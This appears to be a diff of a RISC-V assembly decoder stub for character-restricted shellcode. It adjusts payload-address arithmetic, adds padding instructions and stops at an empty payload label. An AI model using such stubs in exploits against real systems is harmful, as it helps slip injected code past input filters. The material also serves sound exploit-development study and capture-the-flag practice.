@@ -5,16 +5,15 @@
 _start:
 # get payload address into s0
 	auipc	s0, 0x7e7e1
-#	c.and	a5, a0
 	lui	a6, 0x8181e
 	add	s2, s0, a6
 	sub	s0, s2, x0
         addi    s0, s0, 0x7f7
         addi    s0, s0, 0x7f7
 #The 8-bit is not allowed in set of addi
-#Current Total: 220 (222, test)
-        addi    s0, s0, 114
-	addi	s0, s0, 54
+#Current Total: 282 (286, test)
+        addi    s0, s0, 116
+	addi	s0, s0, 116
 	addi	s0, s0, 54
 
 # load 8 bytes of 0x0F into a7
@@ -62,6 +61,22 @@ _start:
 	c.add	a3, a5
 
 0:
+#Padding
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
+	and	a4, a4, a7
 # get word to write into a0
 	c.ld	a0, 0(s0)
 	c.ld	a2, 8(s0)
@@ -99,6 +114,7 @@ _start:
 	c.jr	a5
 
 1:
+	addi t3, t5, -427
 	c.j	0b
 	.data
 payload:
